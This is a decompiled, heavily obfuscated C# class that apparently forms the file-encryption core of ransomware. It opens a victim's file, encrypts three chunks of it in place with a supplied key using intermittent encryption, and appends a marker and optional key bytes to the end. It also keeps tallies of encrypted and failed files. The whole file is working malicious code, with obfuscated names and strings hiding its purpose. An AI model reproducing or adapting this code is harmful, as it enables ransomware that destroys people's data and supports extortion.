using System;
using System.IO;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using uxJZpPHZaFNzux;

namespace wDtIYaxdpawEu;

internal sealed class QfVKvNIzyJTRTFb
{
	[NonSerialized]
	internal static GetString getString_0;

	public static int xbrtzRpUmghZKrj(long long_0)
	{
		return (int)long_0;
	}

	public static bool nPDNQoqIpmrky(string gqbueWYqnnw, string uvCyDeKvIzbEr, string LUbihQEXqvB, byte[] KOHKLpCiRTP = null, byte[] JEWUMFIRcmkPPNQ = null)
	{
		try
		{
			using (FileStream fileStream = new FileStream(gqbueWYqnnw, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite))
			{
				int num = xbrtzRpUmghZKrj(fileStream.Length) / 3;
				if (num < 0)
				{
					num *= -1;
				}
				int num2 = 0;
				try
				{
					num2 = Convert.ToInt32(uvCyDeKvIzbEr) * Convert.ToInt32(fileStream.Length) / 100 / 2;
					if (num2 < 0)
					{
						num2 *= -1;
					}
				}
				catch
				{
					num2 = 107374182;
				}
				if (num <= num2 - Convert.ToInt32(uvCyDeKvIzbEr) * 1024 * 1024)
				{
					num2 = (num - Convert.ToInt32(uvCyDeKvIzbEr) * 1024 * 1024) / 10;
				}
				int qbSuuHOuiAo = (int)Math.Round((double)num2 / 32.0, MidpointRounding.AwayFromZero) * 32;
				byte[] array = null;
				for (int i = 0; i < 3; i++)
				{
					byte[] byte_ = uKqcxVYIRbKgb(gqbueWYqnnw, fileStream, qbSuuHOuiAo, num * i);
					array = (OwCGWssNrah.FmiPpRhQSBxQ ? CiqamKuyrt.uZhbCYxeOxuMJx(byte_, Convert.FromBase64String(LUbihQEXqvB), JEWUMFIRcmkPPNQ) : scvFMtYlVeb.AIyOtGwWrXEZ(byte_, Convert.FromBase64String(LUbihQEXqvB), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }));
					xSUquOaAMGzsniHa(gqbueWYqnnw, fileStream, array, num * i);
				}
			}
			byte[] array2 = null;
			array2 = (OwCGWssNrah.IflXfWBKZN ? Encoding.ASCII.GetBytes(OwCGWssNrah.iBDvjzxzEcC(getString_0(107377860)) + OwCGWssNrah.iBDvjzxzEcC(getString_0(107378844)) + Convert.ToString(uvCyDeKvIzbEr) + OwCGWssNrah.iBDvjzxzEcC(getString_0(107378844))) : Encoding.ASCII.GetBytes(OwCGWssNrah.iBDvjzxzEcC(getString_0(107377860)) + OwCGWssNrah.iBDvjzxzEcC(getString_0(107378853)) + Convert.ToString(uvCyDeKvIzbEr) + OwCGWssNrah.iBDvjzxzEcC(getString_0(107378853))));
			if (!OwCGWssNrah.IflXfWBKZN)
			{
				using FileStream fileStream2 = new FileStream(gqbueWYqnnw, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				fileStream2.Write(array2, 0, array2.Length);
			}
			else
			{
				using FileStream fileStream3 = new FileStream(gqbueWYqnnw, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				fileStream3.Write(KOHKLpCiRTP, 0, KOHKLpCiRTP.Length);
				fileStream3.Write(array2, 0, array2.Length);
			}
		}
		catch (Exception ex)
		{
			if (OwCGWssNrah.SBPYnaSzKyFP)
			{
				try
				{
					File.AppendAllText(OwCGWssNrah.ndioqUCcjeEwRygxn, getString_0(107398719) + gqbueWYqnnw + getString_0(107377815) + ex.Message + getString_0(107396801));
				}
				catch (Exception)
				{
				}
			}
			OwCGWssNrah.PuPUesizAwkkz++;
			return false;
		}
		OwCGWssNrah.SYFhGDZRgJn++;
		return true;
	}

	public static byte[] uKqcxVYIRbKgb(string tXAQVexKKDmD, FileStream qfHaiDDhAst, int qbSuuHOuiAo, int tvGWBtLCkGSRKT = 0)
	{
		byte[] array = new byte[qbSuuHOuiAo];
		qfHaiDDhAst.Position = tvGWBtLCkGSRKT;
		qfHaiDDhAst.Read(array, 0, qbSuuHOuiAo);
		return array;
	}

	public static void xSUquOaAMGzsniHa(string CokNpPqtrhKwkp, FileStream QiohaejifV, byte[] SCYWeeXASsjp, int WZrfZDCPBF = 0)
	{
		QiohaejifV.Position = WZrfZDCPBF;
		QiohaejifV.Write(SCYWeeXASsjp, 0, SCYWeeXASsjp.Length);
	}

	static QfVKvNIzyJTRTFb()
	{
		Strings.CreateGetStringDelegate(typeof(QfVKvNIzyJTRTFb));
	}
}
